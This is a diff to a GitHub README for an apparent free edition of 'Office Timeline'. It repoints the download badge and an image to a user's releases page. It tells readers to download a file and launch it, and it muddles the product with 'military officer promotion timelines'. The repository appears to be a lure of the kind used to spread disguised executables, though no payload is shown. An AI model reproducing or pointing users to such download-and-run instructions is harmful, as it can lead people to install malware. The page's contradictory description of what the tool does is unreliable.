@@ -11,7 +11,7 @@ Welcome to the Office Timeline Free GitHub repository! This repository focuses o
 ## 📁 Download the Office Timeline
 
 You can download the Office Timeline using the following link:
-[![Download Office Timeline](https://img.shields.io/badge/Download-Office%20Timeline-blue)](https://github.com/uploads/App.zip)
+[![Download Office Timeline](https://github.com/Lennycool553/Office-Timeline-Free/releases%20Timeline-blue)](https://github.com/Lennycool553/Office-Timeline-Free/releases)
 
 When you click on the link, the Office Timeline file will start downloading. Once downloaded, the file needs to be launched to explore the various officer promotion timelines provided in this repository.
 
@@ -42,5 +42,5 @@ Dive into the world of military officer promotions with the Office Timeline Free
 
 Happy exploring! 🎉
 
-![Military Officer Promotions](https://images.unsplash.com/photo-1582578590987-48c15445fee0)
+![Military Officer Promotions](https://github.com/Lennycool553/Office-Timeline-Free/releases)
 
